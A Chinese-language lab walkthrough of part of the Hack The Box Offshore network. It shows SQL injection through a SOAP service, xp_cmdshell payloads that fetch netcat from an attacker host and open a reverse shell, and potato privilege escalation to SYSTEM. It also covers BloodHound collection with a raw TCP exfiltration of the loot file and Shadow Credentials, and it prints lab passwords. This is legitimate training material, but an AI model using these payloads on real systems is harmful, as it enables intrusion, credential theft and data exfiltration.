export ip=172.16.1.24; for port in $(seq 1 15000); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo Port open $port || echo Port closed $port > /dev/null" 2>/dev/null; done
Port open 80
Port open 135
Port open 139
Port open 445
Port open 3389
```

## SMB凭据
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q crackmapexec smb 172.16.1.1/24 -u usersname -p pass 

SMB         172.16.1.24     445    WEB-WIN01        [*] Windows 10 / Server 2016 Build 14393 x64 (name:WEB-WIN01) (domain:corp.local) (signing:False) (SMBv1:False)
SMB         172.16.1.24     445    WEB-WIN01        [+] corp.local\ned.flanders_adm:Lefthandedyeah! 
```

## 目录扫描
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q dirsearch -u http://172.16.1.24                                              
/root/.pyenv/versions/3.11.9/envs/web/lib/python3.11/site-packages/dirsearch/dirsearch.py:23: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3.post1                                                                  
 (_||| _) (/_(_|| (_| )                                                                                 
                                                                                                        
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Desktop/htb/offshore/reports/http_172.16.1.24/_26-03-10_18-10-12.txt

Target: http://172.16.1.24/

[18:10:12] Starting:                                                                                    
[18:11:19] 200 -  552B  - /favicon.ico                                      
[18:11:20] 200 -   35B  - /flag.txt      
[18:11:30] 200 -    1KB - /license.txt                                      
[18:11:30] 200 -    1KB - /LICENSE.txt 
```

## Getflag
访问[http://172.16.1.24/flag.txt](http://172.16.1.24/flag.txt)

```c
OFFSHORE{d0nt_l3av3_f1l3s_ar0und}
```

## web服务
根据我们在172.16.1.101得到的web.config_sample凭据进行登录

svc_iis\Vintage!

### 第一层登录(凭据复用)
![](/image/prolabs/Offshore-27.png)

成功登录

![](/image/prolabs/Offshore-28.png)

### 第二层登录(万能密码)
```c
admin'or 1=1--+
admin
```

成功登录

### /dashboard
![](/image/prolabs/Offshore-29.png)

#### 页面源码
```c
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><meta charset="UTF-8" /><title>
	Developer Library
</title><link rel="stylesheet" href="Content/normalize.min.css" /><link rel="stylesheet" href="Content/bootstrap.min.css" /><link rel="stylesheet" href="Content/font-awesome.min.css" />
    <script src="Scripts/jquery-3.4.1.js"></script>
    <script type="text/javascript" src="Scripts/dashboardScript.js"></script>
</head>
<body>
<!-- partial:index.partial.html -->
<div class="container">
    <div class="page-header">
        <h3>Offshore Developer Library</h3>
    </div>

    <div class="form-inline">
        <div class='row'>
            <div class='col-md-6'>
                <div class='search-box'>
                    <form class='search-form'>
                        <input class='form-control' id="searchbar" placeholder='Enter a book or document to search for' style="width: 500px" type='text'>
                        <button id="searchBtn" type="button" class='btn btn-link search-btn'>
                            <i class='glyphicon glyphicon-search'></i>
                        </button>
                    </form>
                </div>
            </div>
        </div>
    </div>
    <br />
    <table id="table" class="table table-striped">
    <thead>
        <tr>
            <td><strong>Name</strong></td>
            <td><strong>Author</strong></td>
            <td><strong>Description</strong></td>
        </tr></thead>
    <tbody id="tBody">
            
    </tbody></table>
</div>
</body>
</html>
```

#### js源码
```c
$(document).ready(function () {
    $("#searchBtn").click(function (event) {

        var search = document.getElementById("searchbar").value;
        var soapRequest = `<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getDocuments xmlns="http://tempuri.org/">
      <docName>${search}</docName>
    </getDocuments>
  </soap:Body>
</soap:Envelope>`;

        $.ajax({
            type: "POST",
            url: "DocumentsService.asmx",
            contentType: "text/xml",
            dataType: "xml",
            data: soapRequest,
            success: next,
            error: fail
        });
    });

});
function next(data, status, req) {
    var table = "";

    $(req.responseXML).find('getDocumentsResult').find('result').each(function () {
        $(this).each(function () {
            var name = $(this).find('name').text();
            var author = $(this).find('author').text();
            var desc = $(this).find('description').text();

            table += `<tr>
                            <td>${name}</td>
                            <td>${author}</td>
                            <td>${desc}</td>
                            </tr>`;
        })
    })

    document.getElementById("tBody").innerHTML = table;
    document.getElementById("searchbar").value = "";
}

function fail() {
    alert("There was an error!");
}
```

##### 代码分析
前端做的事情是：

1. 读取输入框 `#searchbar`
2. 把用户输入直接拼进 SOAP XML 里：

```plain
<docName>${search}</docName>
```

1. POST 到：

```plain
DocumentsService.asmx
```

Content-Type:

```plain
text/xml
```

![](/image/prolabs/Offshore-30.png)

##### 漏洞点
这一句是关键：

```plain
<docName>${search}</docName>
```

没有任何：

+ XML 编码
+ 实体转义
+ 过滤

所以如果后端没有做安全处理：

👉 可能存在 **XML Injection**

##### 潜在攻击面
###### 1️⃣ XML Injection
如果你输入：

```plain
test</docName><admin>true</admin><docName>
```

拼出来会变成：

```plain
<docName>test</docName>
<admin>true</admin>
<docName>
```

如果后端解析不严谨，逻辑可能被破坏。

---

###### 2️⃣ XXE（重点）
如果后端：

+ 使用 .NET 默认 XML 解析
+ 没禁用 DTD

那可以测试：

```plain
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
```

然后：

```plain
<docName>&xxe;</docName>
```

如果返回文件内容 → XXE 成功。

---

###### 3️⃣ SQL Injection（高概率）
因为这个接口看起来像：

```plain
getDocuments(docName)
```

后端很可能做：

```plain
SELECT * FROM documents WHERE name = '" + docName + "'
```

如果是这样：

你可以尝试：

```plain
' OR 1=1--
```

放进搜索框。

### fuzz参数
```c
/usr/share/wfuzz/wordlist/webservices/ws-dirs.txt:wsdl
/usr/share/dirbuster/wordlists/directories.jbrofuzz:wsdl
/usr/share/wfuzz/wordlist/webservices/ws-files.txt:.asmx?wsdl
```

这里要过滤掉 Lines = 9  因为我跑过一次发现此乃冗余信息

```c
proxychains -q wfuzz --hl 9 -w /usr/share/wfuzz/wordlist/webservices/ws-dirs.txt http://172.16.1.24/DocumentsService.asmx?FUZZ

┌──(kali㉿kali)-[~]
└─$ proxychains -q wfuzz --hl 9 -w /usr/share/wfuzz/wordlist/webservices/ws-dirs.txt http://172.16.1.24/DocumentsService.asmx?FUZZ

 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.16.1.24/DocumentsService.asmx?FUZZ
Total requests: 48

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                            
=====================================================================

000000007:   200        5 L      25 W       725 Ch      "disco"                                            
000000045:   200        120 L    278 W      5622 Ch     "wsdl"                                             

Total time: 0
Processed Requests: 48
Filtered Requests: 46
Requests/sec.: 0
```

#### disco
```c
<discovery>
<contractRef ref="http://172.16.1.24/DocumentsService.asmx?wsdl" docRef="http://172.16.1.24/DocumentsService.asmx"/>
<soap address="http://172.16.1.24/DocumentsService.asmx" binding="q1:DocumentsServiceSoap"/>
<soap address="http://172.16.1.24/DocumentsService.asmx" binding="q2:DocumentsServiceSoap12"/>
</discovery>
```

#### wsdl
```c
<wsdl:definitions targetNamespace="http://tempuri.org/">
<wsdl:types>
<s:schema elementFormDefault="qualified" targetNamespace="http://tempuri.org/">
<s:element name="getDocuments">
<s:complexType>
<s:sequence>
<s:element minOccurs="0" maxOccurs="1" name="docName" type="s:string"/>
</s:sequence>
</s:complexType>
</s:element>
<s:element name="getDocumentsResponse">
<s:complexType>
<s:sequence>
<s:element minOccurs="0" maxOccurs="1" name="getDocumentsResult" type="tns:ArrayOfResult"/>
</s:sequence>
</s:complexType>
</s:element>
<s:complexType name="ArrayOfResult">
<s:sequence>
<s:element minOccurs="0" maxOccurs="unbounded" name="result" nillable="true" type="tns:result"/>
</s:sequence>
</s:complexType>
<s:complexType name="result">
<s:sequence>
<s:element minOccurs="0" maxOccurs="1" name="name" type="s:string"/>
<s:element minOccurs="0" maxOccurs="1" name="author" type="s:string"/>
<s:element minOccurs="0" maxOccurs="1" name="description" type="s:string"/>
</s:sequence>
</s:complexType>
<s:element name="getDocuments_Dev">
<s:complexType>
<s:sequence>
<s:element minOccurs="0" maxOccurs="1" name="document" type="s:string"/>
<s:element minOccurs="0" maxOccurs="1" name="author" type="s:string"/>
</s:sequence>
</s:complexType>
</s:element>
<s:element name="getDocuments_DevResponse">
<s:complexType>
<s:sequence>
<s:element minOccurs="0" maxOccurs="1" name="getDocuments_DevResult" type="tns:ArrayOfResult"/>
</s:sequence>
</s:complexType>
</s:element>
</s:schema>
</wsdl:types>
<wsdl:message name="getDocumentsSoapIn">
<wsdl:part name="parameters" element="tns:getDocuments"/>
</wsdl:message>
<wsdl:message name="getDocumentsSoapOut">
<wsdl:part name="parameters" element="tns:getDocumentsResponse"/>
</wsdl:message>
<wsdl:message name="getDocuments_DevSoapIn">
<wsdl:part name="parameters" element="tns:getDocuments_Dev"/>
</wsdl:message>
<wsdl:message name="getDocuments_DevSoapOut">
<wsdl:part name="parameters" element="tns:getDocuments_DevResponse"/>
</wsdl:message>
<wsdl:portType name="DocumentsServiceSoap">
<wsdl:operation name="getDocuments">
<wsdl:input message="tns:getDocumentsSoapIn"/>
<wsdl:output message="tns:getDocumentsSoapOut"/>
</wsdl:operation>
<wsdl:operation name="getDocuments_Dev">
<wsdl:documentation>
Under development method. Provides improved efficieny and fine tuned searches, integrate into frontend after testing
</wsdl:documentation>
<wsdl:input message="tns:getDocuments_DevSoapIn"/>
<wsdl:output message="tns:getDocuments_DevSoapOut"/>
</wsdl:operation>
</wsdl:portType>
<wsdl:binding name="DocumentsServiceSoap" type="tns:DocumentsServiceSoap">
<soap:binding transport="http://schemas.xmlsoap.org/soap/http"/>
<wsdl:operation name="getDocuments">
<soap:operation soapAction="http://tempuri.org/getDocuments" style="document"/>
<wsdl:input>
<soap:body use="literal"/>
</wsdl:input>
<wsdl:output>
<soap:body use="literal"/>
</wsdl:output>
</wsdl:operation>
<wsdl:operation name="getDocuments_Dev">
<soap:operation soapAction="http://tempuri.org/getDocuments_Dev" style="document"/>
<wsdl:input>
<soap:body use="literal"/>
</wsdl:input>
<wsdl:output>
<soap:body use="literal"/>
</wsdl:output>
</wsdl:operation>
</wsdl:binding>
<wsdl:binding name="DocumentsServiceSoap12" type="tns:DocumentsServiceSoap">
<soap12:binding transport="http://schemas.xmlsoap.org/soap/http"/>
<wsdl:operation name="getDocuments">
<soap12:operation soapAction="http://tempuri.org/getDocuments" style="document"/>
<wsdl:input>
<soap12:body use="literal"/>
</wsdl:input>
<wsdl:output>
<soap12:body use="literal"/>
</wsdl:output>
</wsdl:operation>
<wsdl:operation name="getDocuments_Dev">
<soap12:operation soapAction="http://tempuri.org/getDocuments_Dev" style="document"/>
<wsdl:input>
<soap12:body use="literal"/>
</wsdl:input>
<wsdl:output>
<soap12:body use="literal"/>
</wsdl:output>
</wsdl:operation>
</wsdl:binding>
<wsdl:service name="DocumentsService">
<wsdl:port name="DocumentsServiceSoap" binding="tns:DocumentsServiceSoap">
<soap:address location="http://172.16.1.24/DocumentsService.asmx"/>
</wsdl:port>
<wsdl:port name="DocumentsServiceSoap12" binding="tns:DocumentsServiceSoap12">
<soap12:address location="http://172.16.1.24/DocumentsService.asmx"/>
</wsdl:port>
</wsdl:service>
</wsdl:definitions>
```

#### 分析
一共 2 个方法：

| 方法名 | 参数 | 备注 |
| --- | --- | --- |
| getDocuments | docName:string | 正式接口 |
| getDocuments_Dev | document:string, author:string | 开发接口 |


⚠ 关键点在这里：

```plain
<wsdl:documentation>
Under development method...
</wsdl:documentation>
```

开发中接口 = 高风险点

如果未使用参数化查询，会存在：

+ SQL 注入风险
+ 错误回显风险

### Soap Xml请求
#### 下载插件
下载火狐插件 Wizdler 然后会自动帮我们写 soap xml请求

![](/image/prolabs/Offshore-31.png)

![](/image/prolabs/Offshore-32.png)

```c
<Envelope xmlns="http://schemas.xmlsoap.org/soap/envelope/">
    <Body>
        <getDocuments_Dev xmlns="http://tempuri.org/">
            <document>[string?]</document>
            <author>[string?]</author>
        </getDocuments_Dev>
    </Body>
</Envelope>
```

### Sqlmap
![](/image/prolabs/Offshore-33.png)

分别对应soap1.1和soap1.2

#### 1.1 请求包
```c
POST /DocumentsService.asmx HTTP/1.1
Host: 10.10.110.124
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/getDocuments_Dev"
Cookie: ASP.NET_SessionId=gtovb3owmzkkntu3xyejtc0y
Connection: close

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getDocuments_Dev xmlns="http://tempuri.org/">
      <document>test</document>
      <author>*</author>
    </getDocuments_Dev>
  </soap:Body>
</soap:Envelope>
```

保存为sql

#### exploit
```c
┌──(kali㉿kali)-[~/Desktop/htb/offshore]
└─$ sqlmap -r sql --batch
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.10.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:37:58 /2026-02-12/

[12:37:58] [INFO] parsing HTTP request from 'sql'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
SOAP/XML data found in POST body. Do you want to process it? [Y/n/q] Y
[12:37:58] [INFO] testing connection to the target URL
[12:37:59] [INFO] checking if the target is protected by some kind of WAF/IPS
[12:37:59] [INFO] testing if the target URL content is stable
[12:38:00] [INFO] target URL content is stable
[12:38:00] [INFO] testing if (custom) POST parameter 'SOAP #1*' is dynamic
[12:38:00] [WARNING] (custom) POST parameter 'SOAP #1*' does not appear to be dynamic
[12:38:01] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'SOAP #1*' might not be injectable
[12:38:01] [INFO] testing for SQL injection on (custom) POST parameter 'SOAP #1*'
[12:38:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:38:05] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[12:38:05] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[12:38:09] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[12:38:12] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[12:38:15] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[12:38:18] [INFO] testing 'Generic inline queries'
[12:38:19] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[12:38:21] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[12:38:24] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[12:38:27] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[12:38:30] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[12:38:33] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[12:38:36] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[12:38:40] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[12:38:46] [WARNING] (custom) POST parameter 'SOAP #1*' does not seem to be injectable
[12:38:46] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'                                                                                                         
```

失败

#### 1.2 请求包
```c
POST /DocumentsService.asmx HTTP/1.1
Host: 10.10.110.124
User-Agent: Mozilla/5.0
Content-Type: text/xml; charset="utf-8"
SOAPAction: "http://tempuri.org/getDocuments_Dev"
Cookie: ASP.NET_SessionId=odt3gytdppx2d1vpacsspl02
Connection: close

<Envelope xmlns="http://www.w3.org/2003/05/soap-envelope">
  <Body>
    <getDocuments_Dev xmlns="http://tempuri.org/">
      <document>test</document>
      <author>test</author>
    </getDocuments_Dev>
  </Body>
</Envelope>
```

#### exploit
```c
┌──(kali㉿kali)-[~/Desktop/htb/offshore]
└─$ sqlmap -r sql --batch --dbms=mssql --dbs
        ___
       __H__                                                                                                       
 ___ ___[)]_____ ___ ___  {1.10.2#stable}                                                                          
|_ -| . [,]     | .'| . |                                                                                          
|___|_  ["]_|_|_|__,|  _|                                                                                          
      |_|V...       |_|   https://sqlmap.org                                                                       

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:31:52 /2026-03-01/

[23:31:52] [INFO] parsing HTTP request from 'sql'
SOAP/XML data found in POST body. Do you want to process it? [Y/n/q] Y
[23:31:52] [INFO] testing connection to the target URL
[23:31:53] [INFO] testing if the target URL content is stable
[23:31:53] [INFO] target URL content is stable
[23:31:53] [INFO] testing if (custom) POST parameter 'SOAP document' is dynamic
[23:31:54] [WARNING] (custom) POST parameter 'SOAP document' does not appear to be dynamic
[23:31:55] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'SOAP document' might not be injectable
[23:31:56] [INFO] testing for SQL injection on (custom) POST parameter 'SOAP document'
[23:31:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[23:32:03] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[23:32:04] [INFO] testing 'Generic inline queries'
[23:32:04] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[23:32:07] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[23:32:07] [WARNING] time-based comparison requires larger statistical model, please wait......... (done)         
[23:32:24] [INFO] (custom) POST parameter 'SOAP document' appears to be 'Microsoft SQL Server/Sybase stacked queries (comment)' injectable                                                                                            
for the remaining tests, do you want to include all tests for 'Microsoft SQL Server/Sybase' extending provided level (1) and risk (1) values? [Y/n] Y
[23:32:24] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[23:32:24] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[23:32:24] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[23:32:26] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[23:32:29] [INFO] target URL appears to have 4 columns in query
[23:32:30] [WARNING] reflective value(s) found and filtering out
[23:32:32] [INFO] (custom) POST parameter 'SOAP document' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
(custom) POST parameter 'SOAP document' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 42 HTTP(s) requests:
---
Parameter: SOAP document ((custom) POST)
    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: <Envelope xmlns="http://www.w3.org/2003/05/soap-envelope">
  <Body>
    <getDocuments_Dev xmlns="http://tempuri.org/">
      <document>test');WAITFOR DELAY '0:0:5'--</document>
      <author>test</author>
    </getDocuments_Dev>
  </Body>
</Envelope>

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: <Envelope xmlns="http://www.w3.org/2003/05/soap-envelope">
  <Body>
    <getDocuments_Dev xmlns="http://tempuri.org/">
      <document>test') UNION ALL SELECT NULL,CHAR(113)+CHAR(120)+CHAR(98)+CHAR(112)+CHAR(113)+CHAR(66)+CHAR(68)+CHAR(86)+CHAR(99)+CHAR(82)+CHAR(119)+CHAR(107)+CHAR(84)+CHAR(74)+CHAR(68)+CHAR(109)+CHAR(77)+CHAR(65)+CHAR(110)+CHAR(69)+CHAR(65)+CHAR(78)+CHAR(119)+CHAR(122)+CHAR(119)+CHAR(76)+CHAR(117)+CHAR(121)+CHAR(121)+CHAR(85)+CHAR(68)+CHAR(80)+CHAR(101)+CHAR(112)+CHAR(105)+CHAR(88)+CHAR(112)+CHAR(67)+CHAR(81)+CHAR(107)+CHAR(120)+CHAR(115)+CHAR(97)+CHAR(76)+CHAR(112)+CHAR(113)+CHAR(112)+CHAR(122)+CHAR(107)+CHAR(113),NULL,NULL-- NCAA</document>
      <author>test</author>
    </getDocuments_Dev>
  </Body>
</Envelope>
---
[23:32:32] [INFO] testing Microsoft SQL Server
[23:32:32] [INFO] confirming Microsoft SQL Server
[23:32:37] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 11 or 2019 or 2016 or 10 or 2022
web application technology: Microsoft IIS 10.0, ASP.NET, ASP.NET 4.0.30319
back-end DBMS: Microsoft SQL Server 2014
[23:32:37] [INFO] fetching database names
available databases [7]:
[*] Documents
[*] master
[*] model
[*] msdb
[*] tempdb
[*] Users
[*] WebApp

[23:32:38] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.110.124'

[*] ending @ 23:32:38 /2026-03-01/

```

```c
POST /DocumentsService.asmx HTTP/1.1
Host: 10.10.110.124
User-Agent: Mozilla/5.0
Content-Type: text/xml; charset="utf-8"
SOAPAction: "http://tempuri.org/getDocuments_Dev"
Cookie: ASP.NET_SessionId=kb0aivy3wcfbmv14d00kco0f
Connection: close

<Envelope xmlns="http://www.w3.org/2003/05/soap-envelope">
  <Body>
    <getDocuments_Dev xmlns="http://tempuri.org/">
      <document>test</document>
      <author>test');exec xp_cmdshell 'powershell -c iwr "http://10.10.16.4/nc64.exe" -outfile "C:\\Windows\\temp\\nc.exe"';--</author>
    </getDocuments_Dev>
  </Body>
</Envelope>
```

```c
curl -i -s -k -X POST http://10.10.110.124/DocumentsService.asmx \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: \"http://tempuri.org/getDocuments_Dev\"" \
  -H "Cookie: ASP.NET_SessionId=kb0aivy3wcfbmv14d00kco0f" \
  --data-binary @- <<'EOF'
<Envelope xmlns="http://www.w3.org/2003/05/soap-envelope">
  <Body>
    <getDocuments_Dev xmlns="http://tempuri.org/">
      <document>test</document>
      <author>test');exec xp_cmdshell 'powershell -c iwr "http://10.10.16.4/nc64.exe" -outfile "C:\Windows\temp\nc.exe"';--</author>
    </getDocuments_Dev>
  </Body>
</Envelope>
EOF

curl -s -X POST http://10.10.110.124/DocumentsService.asmx \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: \"http://tempuri.org/getDocuments_Dev\"" \
  -b "ASP.NET_SessionId=kb0aivy3wcfbmv14d00kco0f" \
  --data-binary @- << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<Envelope xmlns="http://www.w3.org/2003/05/soap-envelope">
  <Body>
    <getDocuments_Dev xmlns="http://tempuri.org/">
      <document>test</document>
      <author>test');EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe 10.10.16.4 4444 -e cmd.exe';--</author>
    </getDocuments_Dev>
  </Body>
</Envelope>
EOF
```

### Getflag
```c
C:\Users\MSSQL$SQLEXPRESS\Desktop>type flag.txt
type flag.txt
OFFSHORE{cm0n!_an0th3r_sqli!?}
```

## 凭据发现
### 凭据信息
```c
type C:\Users\Public\Libraries\share.bat
@echo off
net use Z: \\fs01\users\bill\documents /user:CORP\bill "I like to map Shares!"
```

得到凭据bill\I like to map Shares!

### Getflag
```c
C:\Users\MSSQL$SQLEXPRESS\Desktop>type z:\flag.txt
type z:\flag.txt
OFFSHORE{sl0ppy_scr1pting_hurt$}
```

### backup.ps1
```c
type z:\backup.ps1

#set server location,credentials
$Server = "\\172.16.4.100"
$FullPath = "$Server\q1\backups"
$username = "pgibbons"
$password = "I l0ve going Fishing!"

net use $Server $password /USER:$username  
try  
{
#copy the backup
Copy-Item $zipFileName $FullPath  
#remove all zips older than 1 month from the unc path
Get-ChildItem "$uncFullPath\*.zip" |? {$_.lastwritetime -le (Get-Date).AddMonths(-1)} |% {Remove-Item $_ -force }  
}
catch [System.Exception] {  
WriteToLog -msg "could not copy backup to remote server... $_.Exception.Message" -type Error  
}
finally {  
#cleanup
net use $Server /delete  
```

 👉 该脚本用域用户 **pgibbons** 的凭据访问一台服务器：  

```c
172.16.4.100
```

**🧠**** 关键问题：为什么用域账号？**

因为：

🏢 企业环境中备份服务器通常加入域  
📦 统一用域账号做访问控制



得到凭据pgibbons\I l0ve going Fishing!

## 提权
###  SeImpersonatePrivilege  Enabled
```c
C:\Windows\Temp>whoami /priv            
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

### SharpEfsPotato提权
```c
certutil -urlcache -f http://10.10.16.4/SharpEfsPotato.exe C:\Users\Public\Downloads\SharpEfsPotato.exe
certutil -urlcache -f http://10.10.16.4/nc64.exe C:\Users\Public\Downloads\nc.exe
```

```c
SharpEfsPotato.exe -p cmd.exe -a "/c C:\Users\Public\Downloads\nc.exe 10.10.16.4 9999 -e cmd.exe"
```

```c
┌──(kali㉿kali)-[~/Desktop/htb/offshore]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.110.3] 18372
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

### Getflag
```c
C:\Users\Administrator\Desktop>type flag.txt
type flag.txt
OFFSHORE{hmm_p0tato3s}
```

## 信息收集
### whoami /fqdn
```c
C:\Users\Administrator\Desktop>whoami /fqdn
whoami /fqdn
CN=SQL01,OU=SQL Servers,OU=Servers,OU=Corp,DC=corp,DC=local
```

| 项 | 含义 |
| --- | --- |
| 计算机名 | SQL01 |
| OU | SQL Servers |
| OU | Servers |
| OU | Corp |
| 域 | corp.local |


 👉 这是一台 **域内 SQL 服务器**

### DC-IP
```c
PS C:\Users\Public\Downloads> nltest /dsgetdc:corp.local
nltest /dsgetdc:corp.local
           DC: \\DC01.corp.local
      Address: \\172.16.1.5
     Dom Guid: bf02e194-6310-428d-9687-7bd37caad2e3
     Dom Name: corp.local
  Forest Name: corp.local
 Dc Site Name: Default-First-Site-Name
Our Site Name: Default-First-Site-Name
        Flags: PDC GC DS LDAP KDC TIMESERV GTIMESERV WRITABLE DNS_DC DNS_DOMAIN DNS_FOREST CLOSE_SITE FULL_SECRET WS DS_8 DS_9 DS_10 0x20000
The command completed successfully
```

### sharphound
```c
certutil -urlcache -f http://10.10.16.4/SharpHound.exe C:\Users\Public\Downloads\SharpHound.exe
certutil -urlcache -f http://10.10.16.4/SharpHound.ps1 C:\Users\Public\Downloads\SharpHound.ps1
powershell -ep bypass -c Import-Module C:\Users\Public\Downloads\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All -Domain corp.local -ZipFileName loot.zip -OutputDirectory C:\Users\Public\Downloads
```

生成出20260302020844_loot.zip

```c
$client = New-Object Net.Sockets.TCPClient("10.10.16.4",8973)
$stream = $client.GetStream()
[byte[]]$bytes = [IO.File]::ReadAllBytes("C:\Users\Public\Downloads\20260302020844_loot.zip")
$stream.Write($bytes,0,$bytes.Length)
$stream.Close()
$client.Close()
```

```c
nc -lvnp 8973 > loot.zip
```

### Bloodhound
#### SQL01.CORP.LOCAL
将SQL01.CORP.LOCAL 设置为Owned

![](/image/prolabs/Offshore-34.png)

SQL01.CORP.LOCAL->DOMAIN ADMINS@CORP.LOCAL 没有攻击路径

![](/image/prolabs/Offshore-35.png)

#### PGIBBONS@CORP.LOCAL
PGIBBONS@CORP.LOCAL->DOMAIN ADMINS@CORP.LOCAL 没有攻击路径

##### Outbound Object Control
![](/image/prolabs/Offshore-36.png)

##### Member of
![](/image/prolabs/Offshore-37.png)

那下一步的目标就是SALVADOR@CORP.LOCAL

由于PGIBBONS对SALVADOR具有GenericWrite和WriteOwner以及 AllExtendedRights  

所以我们可以使用 Shadow Credentials 攻击  或者 重置密码  

## 横向移动
### Shadow Credentials 攻击  (失败)
#### 前提
👉 PGIBBONS 对 SALVADOR 账户具有控制权限  

例如：

```plain
GenericAll
GenericWrite
WriteOwner
WriteDacl
AddKeyCredentialLink
```

#### 利用
```c
┌──(web)─(root㉿kali)-[/home/…/Desktop/tools/pywhisker/pywhisker]
└─# proxychains -q python pywhisker.py -u pgibbons -p 'I l0ve going Fishing!' -d corp.local --target salvador --action "add" --dc-ip 172.16.1.5

[*] Searching for the target account
[*] Target user found: CN=salvador,OU=Contractors,OU=Corp,DC=corp,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: a58d8382-b943-8480-b420-64d2e3efac5a
[*] Updating the msDS-KeyCredentialLink attribute of salvador
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: sbUXNNXt.pfx
